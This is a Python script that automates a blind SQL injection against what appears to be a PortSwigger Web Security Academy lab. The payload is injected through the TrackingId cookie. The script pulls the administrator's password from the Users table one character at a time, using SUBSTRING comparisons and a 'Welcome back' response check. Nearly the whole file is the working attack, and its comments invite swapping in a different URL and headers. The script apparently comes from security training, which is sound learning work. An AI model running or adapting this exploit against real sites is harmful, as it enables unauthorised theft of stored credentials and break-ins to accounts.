import requests
import string
# This script is used to brute force on blind SQL injections when the injection is off of the cookies
# Base URL and headers for the request. Replace URL and headers where's needed
base_url = "https://0a67005c039091b281fd3bfa004300e3.web-security-academy.net/filter?category=Accessories"
headers = {
    "Host": "0a67005c039091b281fd3bfa004300e3.web-security-academy.net",
    "Sec-Ch-Ua": '"Chromium";v="129", "Not=A?Brand";v="8"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Linux"',
    "Accept-Language": "en-US,en;q=0.9",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Referer": "https://0a67005c039091b281fd3bfa004300e3.web-security-academy.net/",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=0, i",
}

# Characters to brute-force (a-z, 0-9)
characters = string.ascii_lowercase + string.digits

# Function to brute-force the password
def brute_force_password():
    password = ""
    position = 1
    while True:
        found = False
        for char in characters:
            # Constructing the TrackingId parameter for the SQL Injection payload. Replace where needed
            tracking_id = f"cFWHlSnjFxjZFUr9'+AND+SUBSTRING((SELECT+Password+FROM+Users+WHERE+Username='administrator'),{position},1)='{char}"
            cookies = {
                "TrackingId": tracking_id,
                "session": "i6LyJPhOirHY2AVxBND9StAYE0ETUAiJ"
            }

            # Sending the request
            response = requests.get(base_url, headers=headers, cookies=cookies)
            
            # Check if the correct response contains "Welcome back"
            if "Welcome back" in response.text:
                password += char
                print(f"Character found: {char}")
                found = True
                break
        
        if not found:
            print("Password fully discovered!")
            break
        
        position += 1
    
    print(f"Password: {password}")

if __name__ == "__main__":
    brute_force_password()
